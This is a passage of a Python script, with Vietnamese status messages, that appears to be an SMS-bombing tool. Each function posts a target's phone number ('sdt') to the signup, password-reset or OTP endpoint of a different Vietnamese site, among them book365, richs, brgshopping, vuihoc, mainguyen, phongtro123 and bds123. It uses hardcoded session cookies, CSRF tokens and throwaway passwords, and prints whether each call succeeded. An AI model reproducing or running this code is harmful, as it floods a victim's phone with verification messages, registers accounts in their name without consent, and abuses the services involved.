        print("BOOK365REG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BOOK365REG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def book365():
    cookies = {
        'PHPSESSID': 'q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
        'origin': 'https://book365.vn',
        'priority': 'u=1, i',
        'referer': 'https://book365.vn/nha-phat-hanh/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'dangky_phone': sdt,
        'action': 'quen_mat_khau',
        'pass': '123123aa',
    }

    try:
        response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BOOK365 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BOOK365 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def richvn():
    cookies = {
        'PHPSESSID': 'fuicgjd30upebumm4r2sj83uac',
        'form_key': 'a96448cs9GVfs2QA',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'form_key': 'a96448cs9GVfs2QA',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'private_content_version': 'bb9bb549c6dafcf4e687a7b83e4ce8c2',
        'section_data_ids': '%7B%22customer%22%3A1723048444%2C%22cart%22%3A1723048444%7D',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'PHPSESSID=fuicgjd30upebumm4r2sj83uac; form_key=a96448cs9GVfs2QA; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=a96448cs9GVfs2QA; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=bb9bb549c6dafcf4e687a7b83e4ce8c2; section_data_ids=%7B%22customer%22%3A1723048444%2C%22cart%22%3A1723048444%7D',
        'Origin': 'https://shop.richs.com.vn',
        'Referer': 'https://shop.richs.com.vn/customer/account/create/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post('https://shop.richs.com.vn/phone/account/phonecode/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("RICHVN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("RICHVN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def brgshopping():
    cookies = {
        'frontend_lang': 'vi_VN',
        'brgshopping.vn': 'brgshopping.vn',
        'brg_cookie_popup': 'xxxxxxxxxxx',
        'session_id': '99afa4f7b7fb49a2a12cfa5eaa78e866fb90136a',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'frontend_lang=vi_VN; brgshopping.vn=brgshopping.vn; brg_cookie_popup=xxxxxxxxxxx; session_id=99afa4f7b7fb49a2a12cfa5eaa78e866fb90136a',
        'Origin': 'https://brgshopping.vn',
        'Referer': 'https://brgshopping.vn/web/signup',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'csrf_token': '6b3ae11de46aadc384265ad16747be93c6a96b2eo1723707360',
        'login': sdt,
        'name': 'John Davis',
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'redirect': '',
        'token': '',
    }

    try:
        response = requests.post('https://brgshopping.vn/web/signup', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BRGSHOPPING | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BRGSHOPPING | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def nativex():
    headers = {
        'accept': '*/*',
        'accept-language': 'vn',
        'apinfo': '',
        'app-domain': 'nativex',
        'content-type': 'application/json',
        'origin': 'https://nativex.edu.vn',
        'platform': 'web',
        'priority': 'u=1, i',
        'referer': 'https://nativex.edu.vn/',
        'region': 'vn',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'operationName': 'RegisterContact',
        'variables': {
            'name': 'dat van',
            'email': 'ffdjkwe22@gmail.com',
            'contactNo': f'84{sdt}',
            'age': '18-22',
            'contactSource': 'nativex-edu',
            'referredByCode': '',
        },
        'query': 'mutation RegisterContact($name: String!, $email: String!, $contactNo: String!, $age: String, $school: String, $schoolClub: String, $futureGoal: String, $sourceUrl: String, $contactSource: String, $referer: String, $position: String, $companyName: String, $contactSourceType: ContactSourceType, $referredByCode: String, $studentType: String) {\n  registerContact(\n    name: $name\n    email: $email\n    contactNo: $contactNo\n    age: $age\n    school: $school\n    schoolClub: $schoolClub\n    futureGoal: $futureGoal\n    sourceUrl: $sourceUrl\n    contactSource: $contactSource\n    referer: $referer\n    position: $position\n    companyName: $companyName\n    contactSourceType: $contactSourceType\n    referredByCode: $referredByCode\n    studentType: $studentType\n  ) {\n    contact {\n      id\n      contactNo\n      isUserAlreadyExist\n      smsValidityInSec\n      contactUsRequested\n      email\n      splitTestCategory\n      __typename\n    }\n    message\n    statusCode\n    __typename\n  }\n}\n',
    }

    try:
        response = requests.post('https://api-gateway.prod.nativex.edu.vn/graphql', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NATIVEX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("NATIVEX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vuihoc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '3',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mainguyen():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'https://member.mainguyen.vn',
        'Referer': 'https://member.mainguyen.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'content-type': 'application/json',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
    }

    json_data = {
        'phone': sdt,
        'password': '123123aA@',
        'name': 'thahn van',
    }

    response = requests.post('https://api.mainguyen.vn/auth/customer/register', params=params, headers=headers, json=json_data)

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://member.mainguyen.vn',
    'Referer': 'https://member.mainguyen.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    'content-type': 'application/json',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'guestKey': 'dde60be3eb3859db4a4f15351134c991',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.mainguyen.vn/auth/customer/request-otp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MAINGUYEN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MAINGUYEN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def phongtro123():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D',
        'pt123': 'as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Im5QOVFUUmg2Ty9vbXJnRWllU1V4SEE9PSIsInZhbHVlIjoiSTNIN1V1RWJuaXlINC9EZS9HYk03MDltcWhyakN5bExHTm1zaC9WTmQ5d3I2anJLZld5QzJMcEhyRmpQYUdJeUVXd0NHNkNVaFY2amNpY1k1YnFKdDBRdm0vN2dIWFVqQnlMTStTbnNSTWJKTVpCMUIrbnZsYjV5azdySi96L2YiLCJtYWMiOiI1ODhmMDE0NzQ5MjQ2MzEyZjczYjczOTliOGNmN2RjY2RlYzhjYWEyNjFmODlkNDZmZDFhODEzM2M5NjRjMDAwIiwidGFnIjoiIn0%3D; pt123=as9S3hDuOYKkfWyEpIyHOQ0GeVoAMeXU0Qi5K3kC',
        'origin': 'https://phongtro123.com',
        'priority': 'u=1, i',
        'referer': 'https://phongtro123.com/dang-ky-tai-khoan',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc huuh',
        'phone': sdt,
        'password': '123123aa',
        'user_type': '2',
        'redirect': '',
    }

    response = requests.post('https://phongtro123.com/user/register', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9',
        'XSRF-TOKEN': 'eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D',
        'pt123': '0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjNjdFZQcURYTkxxWGhHdWJ4VUpLemc9PSIsInZhbHVlIjoicExoaWRGalNEYVJQMVVFRTlTWHM1MlB2aGR1aGl4dmJDWTNHaDg2QXAxWm14QkdxK3V5cXBCcExFQUtFQ2lFVzk3TDlsb3FtYUpMQWd6TCt1bkhrTXBPbWoreGFoY0FWM1owMXZISmZ3VS9HTDFDMzMzdEVnbjVyd2svMmJkNXdFSlFlb244bjJPQkpMK1ptaDFJMFp0ZVVPck5WVThGVkdNTTAxNHIwZFp6MU1ZR0ZRRnYwd3hPSXkxLy8yS2dTIiwibWFjIjoiZjRhYzZlOTk3NzUwNDZmYmZmMTQyNWY2NTQ4YjZiNGVmYTgyNWI5MjM4ODE2NzA0ZmViZTI2YmE1OWU2MjQ2MyIsInRhZyI6IiJ9; XSRF-TOKEN=eyJpdiI6IkVmb2N6NCtlbDBHeU8vMGphMnoyOWc9PSIsInZhbHVlIjoiUVJIYWF3STFOSm9ZYnpWQkVXNll5S3pxbGExWStZUUo0RnVUQ21zVEM0S3Y5S3VjcnN3R2I2UDFGTm4xRm1KZ3o0ZlFoQkpGd05OUXlZd051ZGQrb0I0ZEtGR0h5Qy9VdVVFNjJpT3laRXlOa2tScis5VkQyY3VJT2RSM09mTzEiLCJtYWMiOiJlNTY3MGYzNTdkMmVlMWUyYTEzNTIwMmU5YjhkOTAwMTgyOWY4NjBkMTc2YWU3YWIwNWQzMGJmYTM5MWVlOTVmIiwidGFnIjoiIn0%3D; pt123=0ihSBuS6AusN83IAZibBtqvVbH2eH4GI795UTpzl',
        'origin': 'https://phongtro123.com',
        'priority': 'u=1, i',
        'referer': 'https://phongtro123.com/xac-thuc-tai-khoan?f=r',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'd7IH4lHj0sq7jcOx3IZUa5eKcuCwnw51DNxp82F9',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://phongtro123.com/api/user/send-token', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHONGTRO123 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHONGTRO123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def chothuephongtro():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D',
        'bds123_session': 'KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D; bds123_session=KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
        'origin': 'https://chothuephongtro.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuephongtro.me/dang-ky.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc ujy',
        'phone': sdt,
        'password': '123123aa',
        'user_type': '1',
    }

    response = requests.post('https://chothuephongtro.me/api/user/register', cookies=cookies, headers=headers, data=data)

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D',
        'bds123_session': 'pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D; bds123_session=pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
        'origin': 'https://chothuephongtro.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuephongtro.me/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9jaG90aHVlcGhvbmd0cm8ubWUvZGFzaGJvYXJkL2luZGV4Lmh0bWw=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://chothuephongtro.me/api/user/send-token', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHOTHUEPHONGTRO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CHOTHUEPHONGTRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bds123():
    cookies = {
        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
        'XSRF-TOKEN': 'eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D',
        'bds123': '6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua',
        'TawkConnectionTime': '0',
        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
